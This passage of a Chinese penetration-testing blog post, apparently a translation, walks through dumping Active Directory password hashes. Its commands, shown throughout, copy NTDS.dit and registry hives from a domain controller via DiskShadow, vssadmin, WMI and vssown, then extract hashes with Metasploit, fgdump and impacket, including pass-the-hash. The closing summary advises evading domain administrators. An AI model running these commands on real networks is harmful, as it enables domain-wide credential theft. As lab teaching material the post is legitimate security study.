+<h2 id="DiskShadow"><a href="#DiskShadow" class="headerlink" title="DiskShadow"></a>DiskShadow</h2><p>DiskShadow是Microsoft签名的二进制文件，用于协助管理员执行与卷复制服务（VSS）相关的操作。最初bohops在他的博客中写到了这个二进制文件。这个二进制文件有两个交互式和脚本模式，因此可以使用一个脚本文件，它将包含自动执行NTDS.DIT提取过程所需的所有命令。脚本文件可以包含以下行，以便创建新的卷影副本，装入新驱动器，执行复制命令并删除卷影副本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% z:</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit</span><br><span class="line">delete shadows volume %someAlias%</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<p>需要注意一点，<code>DiskShadow</code>二进制文件需要从<code>C\Windows\System32</code>路径执行。如果从另一个路径调用它，脚本将无法正确执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskshadow.exe /s c:\diskshadow.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dff596e-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dff596e-988f-1.png" alt="img"></a><br>直接从解释器运行以下命令将列出系统的所有可用卷影副本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">diskshadow</span><br><span class="line">LIST SHADOWS ALL</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e1c9470-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e1c9470-988f-1.png" alt="img"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e2dbe6c-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e2dbe6c-988f-1.png" alt="img"></a><br><code>SYSTEM</code>注册表配置单元也应该复制，因为它包含解密NTDS文件内容的密钥。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg.exe save hklm\system c:\exfil\system.bak</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e41a936-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e41a936-988f-1.png" alt="img"></a></p>
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>Sean Metcalf在他的<a href="https://adsecurity.org/?p=2398" target="_blank" rel="noopener">博客</a>中证明了，可以通过WMI远程提取NTDS.DIT和SYSTEM文件。此技术使用<code>vssadmin</code>二进制文件来创建卷的副本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e4d0146-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e4d0146-988f-1.png" alt="img"></a><br>然后，它远程执行复制命令，以便将卷影副本中的NTDS.DIT​​文件解压缩到目标系统上的另一个目录中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e59d402-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e59d402-988f-1.png" alt="img"></a><br>这同样适用于SYSTEM文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e659fd0-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e659fd0-988f-1.png" alt="img"></a><br>然后，解压缩的文件可以从域控制器传输到另一个Windows系统，然后dump域内用户密码哈希值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\test.PENTESTLAB&gt; copy \\10.0.0.1\c$\temp\ntds.dit C:\temp</span><br><span class="line">PS C:\Users\test.PENTESTLAB&gt; copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e6f6b00-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e6f6b00-988f-1.png" alt="img"></a><br>如果已生成金票据，则可以使用它通过Kerberos与域控制器进行身份验证，而不是凭据。</p>
+<h2 id="VSSADMIN"><a href="#VSSADMIN" class="headerlink" title="VSSADMIN"></a>VSSADMIN</h2><p>卷影拷贝服务是Windows命令行实用的程序，使管理员可以备份计算机，卷和文件，即使它们正在被操作系统使用。卷影复制作为服务运行，并要求将文件系统格式化为NTFS，默认情况下所有现代操作系统都是如此。从Windows命令提示符执行以下操作将创建C：驱动器的快照，以便用户通常无法访问这些文件以将其复制到另一个位置（本地文件夹，网络文件夹或可移动设备）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=C:</span><br></pre></td></tr></table></figure>
+
+<p>ps:<br>关于Volume Shadow Copy 服务：<br>它是管理及执行用于备份和其他目的的磁碟区卷影。如果这个服务被停止，卷影将无法用于备份，备份可能会失败。如果这个服务被停用，依存它的服务无法启动。<br>这一服务唯一的缺点是你需要为每一个卷影留出更多的磁盘空间，因为你必须在某处存储这些拷贝。<br>它主要是用来备份数据库之类的数据，个人电脑确实一般用不上它。可以放心禁用！</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e7be114-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e7be114-988f-1.png" alt="img"></a></p>
+<p>由于C：驱动器中的所有文件都已复制到另一个位置（HarddiskVolumeShadowCopy1），因此它们不会被操作系统直接使用，因此可以访问他并且复制到另一个位置。命令副本将NTDS.DIT和SYSTEM文件复制到名为ShadowCopy的本地驱动器上的新创建文件夹中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e876886-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e876886-988f-1.png" alt="img"></a><br>需要将这些文件从域控制器复制到另一个主机以进行进一步处理。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e94e646-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e94e646-988f-1.png" alt="img"></a></p>
+<h2 id="vssown"><a href="#vssown" class="headerlink" title="vssown"></a>vssown</h2><p>与vssadmin程序类似，Tim Tomes开发了<a href="https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs" target="_blank" rel="noopener">vssown</a>，它是一个可视化的基本脚本，可以创建和删除卷影副本，从卸载的卷影副本运行任意可执行文件，以及启动和停止卷影复制服务。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br><span class="line">cscript vssown.vbs /create c</span><br><span class="line">cscript vssown.vbs /list</span><br><span class="line">cscript vssown.vbs /delete</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5ea8bfb8-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5ea8bfb8-988f-1.png" alt="img"></a><br>可以使用命令复制所需的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\ntds\ntds.dit C:\vssown</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SYSTEM C:\vssown</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SAM C:\vssown</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eb5e030-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eb5e030-988f-1.png" alt="img"></a></p>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>Metasploit框架有一个模块，它通过服务器消息块（SMB）服务直接与域控制器进行身份验证，创建系统驱动器的卷影副本，并将NTDS.DIT和SYSTEM配置单元的副本下载到Metasploit目录中。这些文件可以与impacket等其他工具一起使用，这些工具可以进行 <code>active directory</code>哈希密码的提取。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_ntdsgrab</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eda5186-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eda5186-988f-1.png" alt="img"></a><br>还有一个后渗透模块，可以链接到现有的Meterpreter会话，以便通过ntdsutil方法检索域哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/gather/credentials/domain_hashdump</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f0213c4-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f0213c4-988f-1.png" alt="img"></a></p>
+<p>或者，如果已经拿到域控制器的现有Meterpreter会话，则可以使用命令hashdump。但是，此方法不被认为是安全的，因为它可能会使域控崩掉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f1d30b4-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f1d30b4-988f-1.png" alt="img"></a></p>
+<h2 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h2><p><a href="http://www.foofus.net/fizzgig/fgdump/fgdump-2.1.0-exeonly.zip" target="_blank" rel="noopener">fgdump</a>是一个比较老的可执行文件，可提取的LanMan和NTLM的密码哈希值。如果已获取本地管理员凭据，则可以在本地或远程执行。在执行期间，fgdump将尝试禁用可能在系统上运行的防病毒软件，如果成功，则会将所有数据写入两个文件中。如果存在防病毒或端点解决方案，则不应该将fgdump用作dump密码哈希的方法以避免检测，因为大多数防病毒公司（包括Microsoft的Windows Defender）都会对将它kill掉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgdump.exe</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f307fd4-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f307fd4-988f-1.png" alt="img"></a></p>
+<p>可以通过检查.pwdump文件的内容来get密码哈希值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type 127.0.0.1.pwdump</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f3d4c6e-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f3d4c6e-988f-1.png" alt="img"></a></p>
+<h2 id="NTDS提取"><a href="#NTDS提取" class="headerlink" title="NTDS提取"></a>NTDS提取</h2><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">Impacket</a>是一组python脚本，可用于执行各种任务，包括提取NTDS文件的内容。<code>impacket-secretsdump</code>模块需要系统和NTDS数据库文件.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f58d240-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f58d240-988f-1.png" alt="img"></a></p>
+<p>此外，impacket可以通过使用计算机帐户及其哈希进行身份验证然后从NTDS.DIT文件远程dump域内所有密码哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f7b4348-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f7b4348-988f-1.png" alt="img"></a></p>
+<p>作为impacket的替代解决方案，<a href="https://github.com/zcgonvh/NTDSDumpEx" target="_blank" rel="noopener">NTDSDumpEx</a>二进制文件可以从Windows主机中提取域密码哈希值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f982364-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f982364-988f-1.png" alt="img"></a></p>
+<p>还有一个shell脚本<a href="https://github.com/LordNem/adXtract" target="_blank" rel="noopener">adXtract</a>，它可以将用户名和密码哈希导出为一种格式，可以使用常见密码破解程序进行破解，例如John the Ripper和Hashcat。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5fbcbeea-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5fbcbeea-988f-1.png" alt="img"></a></p>
+<p>该脚本将所有信息写入项目名称下的各种文件中，当数据库文件NTDS的解密完成后，将用户列表和密码哈希值导出到控制台中。该脚本将提供有关域用户的大量信息，如下所示。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-5fe2dac6-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-5fe2dac6-988f-1.png" alt="img"></a></p>
+<p>密码哈希将以下列格式显示。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-60097d02-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-60097d02-988f-1.png" alt="img"></a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>操作一遍之后，操作确实很多，个人愚见就是，不管哪种方法，都尽量别被域管发现。</p>
+<p>译者：<a href="https://evilwing.me/" target="_blank" rel="noopener">wing</a></p>
+<p>来源: IceWing文章作者: Wing文章链接: </p>
+<p>转自：<a href="https://evilwing.me/2018/08/05/dump-yu-nei-yong-hu-hash-zi-shi-ji-he/" target="_blank" rel="noopener">https://evilwing.me/2018/08/05/dump-yu-nei-yong-hu-hash-zi-shi-ji-he/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/12/30/Dumping-Domain-Password-Hashes/" title="Dumping Domain Password Hashes">https://wh0ale.github.io/2019/12/30/Dumping-Domain-Password-Hashes/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i># 域渗透</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/12/30/Kerberos与Windows域安全/" rel="next" title="Kerberos与Windows域安全">
+                <i class="fa fa-chevron-left"></i> Kerberos与Windows域安全
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#如何Dump域内的Hash"><span class="nav-number">1.</span> <span class="nav-text">如何Dump域内的Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mimikatz"><span class="nav-number">1.1.</span> <span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Empire"><span class="nav-number">1.2.</span> <span class="nav-text">Empire</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nishang"><span class="nav-number">1.3.</span> <span class="nav-text">Nishang</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerSploit"><span class="nav-number">1.4.</span> <span class="nav-text">PowerSploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Invoke-DCSync"><span class="nav-number">1.5.</span> <span class="nav-text">Invoke-DCSync</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTDSUTIL"><span class="nav-number">1.6.</span> <span class="nav-text">NTDSUTIL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DiskShadow"><span class="nav-number">1.7.</span> <span class="nav-text">DiskShadow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI"><span class="nav-number">1.8.</span> <span class="nav-text">WMI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VSSADMIN"><span class="nav-number">1.9.</span> <span class="nav-text">VSSADMIN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vssown"><span class="nav-number">1.10.</span> <span class="nav-text">vssown</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit"><span class="nav-number">1.11.</span> <span class="nav-text">Metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fgdump"><span class="nav-number">1.12.</span> <span class="nav-text">fgdump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTDS提取"><span class="nav-number">1.13.</span> <span class="nav-text">NTDS提取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.14.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">22:49</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
